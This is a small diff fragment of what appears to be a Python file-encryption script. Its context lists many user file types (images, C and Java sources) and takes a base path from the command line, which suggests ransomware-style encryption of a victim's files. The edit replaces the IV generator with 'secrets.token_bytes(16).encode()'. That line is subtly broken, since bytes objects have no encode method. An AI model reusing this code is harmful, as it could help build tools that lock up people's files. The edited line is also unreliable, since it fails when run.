@@ -16,7 +16,7 @@ ext = ('.jpg', '.png', '.bmp', '.raw', '.c', '.java', '.class', '.cpp', '.h', '.
 base_path = sys.argv[1]
 
 def GetInitializationVector():
-    iv = (''.join([chr(random.randint(0, 0xFF)) for i in range(16)])).encode()
+    iv = secrets.token_bytes(16).encode()
     return iv
 
 def EncryptFile(fileToEncrypt, key):
